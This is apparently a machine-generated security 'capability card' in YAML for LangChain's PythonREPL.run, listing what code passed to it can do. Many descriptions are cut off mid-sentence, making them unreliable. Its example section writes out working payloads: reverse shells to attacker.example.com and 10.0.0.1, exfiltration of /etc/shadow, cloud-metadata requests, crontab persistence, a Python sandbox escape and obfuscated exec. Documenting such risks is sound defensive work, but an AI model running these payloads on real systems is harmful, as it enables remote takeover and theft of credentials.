# PythonREPL.run

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-aee4fd46b3f9c37a
api: PythonREPL.run
api_family: langchain.PythonREPL.run
runtime:
  language: python
  ecosystem: python-runtime
  package: langchain
  version: legacy-source-bound
capability_class: code-eval
normative_authority: capability-facts-only
bound_sinks:
- builtins.exec
- builtins.eval
- builtins.compile
- builtins.__import__
- os.system
- os.popen
- subprocess.Popen
- subprocess.run
roles:
- role_id: code
  description: Legacy controlled role code.
  bindings:
  - expression: code
    caller_bindable: true
facets:
- facet_id: legacy-facet-0bc9fad8
  capability: Execute arbitrary Python source code in-process at the privilege level of the
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-654b7d4d
  capability: Accept multi-statement Python code (unlike eval(), exec() internally handles
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-c2e9bc92
  capability: Import any module reachable by the interpreter's sys.path (os, subprocess,
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-41577891
  capability: Execute arbitrary OS shell commands via os.system(), os.popen(),
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-e535302c
  capability: Spawn persistent child processes and interact with their stdin/stdout/stderr
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-57db4afb
  capability: Read, write, create, delete, rename, chmod, and chown any file the host
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-e0349041
  capability: 'Enumerate the filesystem: os.listdir(), os.walk(), glob.glob(), os.scandir().'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-c48605e1
  capability: Access and exfiltrate environment variables (os.environ); propagate modified
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-ac3430bf
  capability: Open arbitrary TCP/UDP sockets (socket, http.client, urllib, requests) —
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-edb16e64
  capability: Bind and listen on local TCP/UDP ports (socket.bind/listen/accept) —
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-52a8e3e2
  capability: Resolve arbitrary hostnames (socket.getaddrinfo, socket.gethostbyname) —
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-d52515da
  capability: Follow HTTP redirects by default when code uses urllib or requests (Python's
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-15b09713
  capability: Load and call arbitrary native shared libraries (.so/.dll/.dylib) via
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-7010c63e
  capability: Dynamically construct and execute further code strings (chained exec/eval/
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-fecc3366
  capability: Access and mutate __builtins__ (replace __import__, inject functions, delete
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-43fb2091
  capability: Modify sys.path to hijack future imports — insert attacker-controlled
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-86d29ac7
  capability: Perform CPython introspection to escape restricted namespaces — walk the
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-cf484fcb
  capability: Access ctypes to read/write arbitrary process memory, call C functions from
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-451bb746
  capability: 'Serialize/deserialize payloads: import pickle, marshal — pickle.loads() on'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-edc034b4
  capability: Write to persistent startup/autoload files (~/.bashrc, ~/.profile, crontab,
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-56d0a1ed
  capability: Access and exfiltrate in-memory secrets already held by the process — API
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-032f02a2
  capability: 'Leak sensitive runtime state: sys.path, sys.modules, sys.argv,'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-31c90eb2
  capability: Spawn an interactive Python REPL (code.interact()) inheriting the current
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-ab38cf82
  capability: Modify or monkey-patch functions and classes in any imported module,
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-400b2a13
  capability: 'Perform denial-of-service: os._exit(0), sys.exit(), os.kill(os.getpid(), 9),'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-d3dc7716
  capability: Send signals (os.kill) to other processes owned by the same user.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-da977e44
  capability: Access inherited file descriptors (os.fdopen on /proc/self/fd entries) and
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-72efc985
  capability: When the host process runs with elevated privileges (root, sudo, setuid,
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-216c0f13
  capability: 'On Windows: inherit the process token and integrity level; access the'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-99a833bd
  role_id: null
  value: PythonREPL.run() wraps exec() with stdout capture — all default exec()
  security_effect: PythonREPL.run() wraps exec() with stdout capture — all default exec()
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-8fd12c59
  role_id: null
  value: The executed code inherits the caller's global and local namespace silently
  security_effect: The executed code inherits the caller's global and local namespace silently
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-0dc38ef0
  role_id: null
  value: stdout/stderr are captured into a string via io.StringIO redirection and
  security_effect: stdout/stderr are captured into a string via io.StringIO redirection and
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-b1712e37
  role_id: null
  value: The __builtins__ reference is automatically populated in the execution
  security_effect: The __builtins__ reference is automatically populated in the execution
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-88e30963
  role_id: null
  value: Python's import system caches imports in sys.modules — once a module is
  security_effect: Python's import system caches imports in sys.modules — once a module is
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-b4d88ebe
  role_id: null
  value: HTTP libraries (urllib, requests) follow redirects by default — no opt-in
  security_effect: HTTP libraries (urllib, requests) follow redirects by default — no opt-in
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-aeabf37f
  role_id: null
  value: DNS resolution for socket operations happens at connect time, not at code
  security_effect: DNS resolution for socket operations happens at connect time, not at code
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-2a353d07
  role_id: null
  value: 'PythonREPL is designed specifically for LLM agent tool-use scenarios: the'
  security_effect: 'PythonREPL is designed specifically for LLM agent tool-use scenarios: the'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-97e082b5
  role_id: null
  value: The deprecation from langchain → langchain_community → langchain_experimental
  security_effect: The deprecation from langchain → langchain_community → langchain_experimental
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: '# LangChain agent uses PythonREPL to compute a math expression

    from langchain_experimental.utilities.python import PythonREPL


    repl = PythonREPL()

    result = repl.run("sum(range(1, 101))")

    print(result)  # "5050\n"


    # Data analysis: compute a statistic on provided data

    repl.run("""

    import statistics

    data = [1, 2, 3, 4, 5, 100]

    print(f"mean={statistics.mean(data)}, median={statistics.median(data)}")

    """)

    '
  capability_edge: "# 1) OS command execution — shell access\nfrom langchain_experimental.utilities.python import PythonREPL\nrepl = PythonREPL()\nrepl.run('import os; os.system(\"id; uname -a; cat /etc/passwd\")')\n\n# 2) Reverse shell — full interactive remote access\nrepl.run(\"\"\"\nimport socket, subprocess, os\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('attacker.example.com', 4444))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\nsubprocess.call(['/bin/sh', '-i'])\n\"\"\")\n\n# 3) Cloud metadata exfiltration (SSRF)\nrepl.run(\"\"\"\nimport urllib.request, json\nurl = 'http://169.254.169.254/latest/meta-data/'\nresp = urllib.request.urlopen(url, timeout=5)\nprint(resp.read().decode())\n\"\"\")\n\n# 4) File read + HTTP exfiltration\nrepl.run(\"\"\"\nimport urllib.request, base64\ndata = open('/etc/shadow', 'rb').read()\nurllib.request.urlopen(urllib.request.Request(\n    'https://attacker.example.com/exfil',\n    base64.b64encode(data),\n\
    \    {'Content-Type': 'application/octet-stream'}\n))\n\"\"\")\n\n# 5) CPython sandbox escape — restore full __builtins__\nrepl.run(\"\"\"\nsubclasses = ().__class__.__bases__[0].__subclasses__()\nfor cls in subclasses:\n    if cls.__name__ == 'catch_warnings':\n        b = cls()._module.__builtins__\n        b['__import__']('os').system('id')\n        break\n\"\"\")\n\n# 6) Persistence via crontab\nrepl.run(\"\"\"\nimport os\npayload = '* * * * * python3 -c \"import socket,subprocess,os;'\npayload += 's=socket.socket();s.connect((\\\\'10.0.0.1\\\\',9999));'\npayload += 'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'\npayload += 'subprocess.call([\\\\'/bin/sh\\\\',\\\\'-i\\\\'])\"'\nos.system(f'(crontab -l 2>/dev/null; echo \"{payload}\") | crontab -')\n\"\"\")\n\n# 7) Native code execution via ctypes\nrepl.run(\"import ctypes; ctypes.CDLL('libc.so.6').system(b'id')\")\n\n# 8) Dynamic code generation — evade static analysis\nrepl.run(\"exec(__import__('base64').b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImlkIik='))\"\
    )\n\n# 9) Interactive REPL spawning — live shell in process\nrepl.run(\"__import__('code').interact(local=dict(globals(), **locals()))\")\n\n# 10) Process termination\nrepl.run(\"import os; os._exit(1)\")\n"
provenance:
- '{''LangChain PythonREPL source'': ''langchain_experimental.utilities.python.PythonREPL''}'
- https://github.com/langchain-ai/langchain/issues/14345 (deprecation due to security scanner flagging)
- '{''CWE-95'': ''Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)''}'
- https://docs.python.org/3/library/functions.html#exec (PythonREPL.run wraps exec())
- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html
- CDP Runtime.evaluate specification (analogous browser-side code-eval capability)
```
